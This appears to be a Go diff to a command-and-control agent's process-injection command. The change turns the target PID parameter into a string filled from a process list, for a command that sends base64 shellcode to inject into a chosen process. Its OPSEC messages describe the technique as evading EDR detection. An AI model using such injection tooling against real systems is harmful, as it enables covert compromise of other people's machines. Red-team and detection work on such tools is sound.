@@ -80,11 +80,12 @@ func init() {
 				},
 			},
 			{
-				Name:             "pid",
-				ModalDisplayName: "Target PID",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
-				Description:      "The process ID to inject into (console process for Variant 1, GUI process for Variant 4)",
-				DefaultValue:     0,
+				Name:                 "pid",
+				ModalDisplayName:     "Target PID",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:          "The process ID to inject into (console process for Variant 1, GUI process for Variant 4)",
+				DynamicQueryFunction: getProcessList,
+				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
@@ -100,24 +101,24 @@ func init() {
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %d. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.", variant, int(pid)),
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.", variant, pid),
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
-			pid, _ := taskData.Args.GetNumberArg("pid")
+			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
 			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
 				TaskID:              taskData.Task.ID,
 				Success:             true,
 				OpsecPostBlocked:    false,
-				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: Opus injection (variant: %s) queued for PID %d. Artifact registered.", variant, int(pid)),
+				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: Opus injection (variant: %s) queued for PID %s. Artifact registered.", variant, pid),
 				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -166,7 +167,7 @@ func init() {
 			}
 
 			// Get the target PID
-			pid, err := taskData.Args.GetNumberArg("pid")
+			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
 				logging.LogError(err, "Failed to get PID")
 				response.Success = false
@@ -194,14 +195,14 @@ func init() {
 
 			// Build the display parameters
 			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d\nNote: %s",
-				variant, variantDesc, filename, len(fileContents), int(pid), targetNote)
+				variant, variantDesc, filename, len(fileContents), pid, targetNote)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, int(pid), len(fileContents)))
+			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
 
 			// Build the actual parameters JSON that will be sent to the agent
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
-				"pid":           int(pid),
+				"pid":           pid,
 				"variant":       variant,
 			}
 
